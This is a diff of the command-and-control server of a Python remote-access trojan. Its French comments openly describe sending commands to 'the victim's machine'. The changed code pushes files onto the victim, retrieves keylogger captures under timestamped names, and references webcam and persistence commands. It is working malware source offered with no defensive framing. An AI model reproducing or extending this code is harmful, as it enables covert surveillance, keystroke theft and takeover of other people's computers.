@@ -83,32 +83,25 @@ def connection():
 
 #la fonction qui vas fair l'envoi des commandes vers la machine de la vicitme
 def sending(command):
-    try:
         # Convert the command to JSON format and send it
         json_data = json.dumps(command)
         target.send(json_data.encode())  # Envoie la commande au client
-    except (ConnectionResetError, BrokenPipeError) as e:
-        print(f"Error sending data: {e}")
-        print("Client may have disconnected or is offline.")
-        return False
-    return True
+   
 
 
 #la fonction qui vas recever les resultats des commande executer dans la machine de la vicitme
 def receive():
     json_data = ""
-    try:
-        while True:
+    while True:
+        try:
+            # Receive data from the target in chunks
             chunk = target.recv(4096).decode('utf-8', errors='replace')
             if not chunk:
-                raise ConnectionResetError("Client has disconnected or is offline.")
+                break
             json_data += chunk
             return json.loads(json_data)
-    except json.JSONDecodeError:
-        pass
-    except ConnectionResetError as e:
-        print(f"Error: {e}")
-        return None
+        except json.JSONDecodeError:
+            continue
 
 
 
@@ -196,33 +189,32 @@ def shell():
            #la commande pour puise uploader des fichier dans la machine de vicitime 
             elif command.startswith("upload "):
                 try:
-                # Récupérer le chemin spécifié par l'utilisateur
-                    filepath = command.split(" ", 1)[1]
-        
-                # Ajouter le répertoire courant s'il s'agit d'un chemin relatif
-                    if not os.path.isabs(filepath):
-                        filepath = os.path.join(reper, filepath)
-                    else: 
-                        filepath = filename
-                # Debug : Afficher le chemin réel utilisé
-                    print(f"Attempting to upload file from: {filepath}")
-        
-                # Vérifier si le fichier existe
-                    if not os.path.exists(filepath):
-                        print(f"File '{filepath}' does not exist.")
+                    # Récupérer le chemin source (local au serveur) et le chemin cible (destination sur le client)
+                    parts = command.split(" ", 2)
+                    if len(parts) < 3:
+                        print("Usage: upload <local_file_path> <remote_target_path>")
                         continue
-        
-        # Lire le fichier
-                    with open(filepath, "rb") as f:
+
+                    local_path = parts[1]  # Chemin du fichier sur le serveur
+                    remote_target = parts[2]  # Chemin cible sur le client
+
+                    # Vérifier si le fichier source existe
+                    if not os.path.exists(local_path):
+                        print(f"File '{local_path}' does not exist.")
+                        continue
+
+                    # Lire et convertir les données du fichier
+                    with open(local_path, "rb") as f:
                         filedata = f.read().hex()
-        
-                    # Envoyer au client
-                    sending(f"upload {filepath} {filedata}")
+
+                    # Envoyer la commande au client
+                    sending(f"upload {remote_target} {filedata}")
                     response = receive()
                     print(response)
                 except Exception as e:
                     print(f"Error uploading file: {str(e)}")
                 continue
+
             
             if command.strip() == "camera":
                 sending(command)  # Envoyer la commande au client
@@ -256,15 +248,28 @@ def shell():
                 continue
             
             elif command.strip() == "keylogger stop":
+                # Envoyer la commande pour arrêter l'enregistrement
                 sending(command)
+                
+                # Attendre la réponse
                 response = receive()
+                
+                # Vérifier si la réponse est réussie
                 if response.get("status") == "success":
-                    keystrokes_path = os.path.join(client_folder, "keylogger", "keystrokes.txt")
-                    with open(keystrokes_path, "wb") as f:
-                        f.write(bytes.fromhex(response["data"]))
-                    print(f"Keystrokes file saved at: {keystrokes_path}")
+                    # Récupérer le chemin du fichier et créer un nom unique pour le fichier de frappes
+                    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
+                    keystrokes_path = os.path.join(client_folder, "keylogger", f"keystrokes_{timestamp}.txt")
+                    
+                    # Sauvegarder le fichier de frappes reçu dans le dossier approprié
+                    try:
+                        with open(keystrokes_path, "wb") as f:
+                            f.write(bytes.fromhex(response["data"]))  # Convertir les données hexadécimales en bytes et les écrire
+                        print(f"Keystrokes file saved at: {keystrokes_path}")
+                    except Exception as e:
+                        print(f"Error saving keystrokes file: {str(e)}")
                 else:
                     print(f"Failed to receive keystrokes file: {response.get('message')}")
+
             
             # Code côté serveur pour envoyer la commande persistance
             elif command.strip() == "persistance":
